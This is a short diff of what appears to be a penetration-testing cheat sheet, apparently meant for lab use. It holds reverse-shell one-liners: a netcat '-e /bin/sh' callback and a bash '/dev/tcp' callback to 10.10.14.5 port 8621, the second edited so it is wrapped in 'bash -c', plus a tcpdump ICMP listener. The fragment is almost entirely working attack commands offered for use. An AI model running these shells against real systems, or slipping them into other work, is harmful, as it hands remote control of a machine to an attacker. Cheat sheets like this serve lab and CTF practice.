@@ -115,7 +115,7 @@ sudo tcpdump ip proto \\icmp -i tun0
 # Depends on the netcat version (some do not have -e)
 nc -e /bin/sh 10.10.14.5 8621
 # Try it, depends on bash
-bash -i >& /dev/tcp/10.10.14.5/8621 0>&1
+bash -c "bash -i >& /dev/tcp/10.10.14.5/8621 0>&1"
 ```
 
 ## Socat
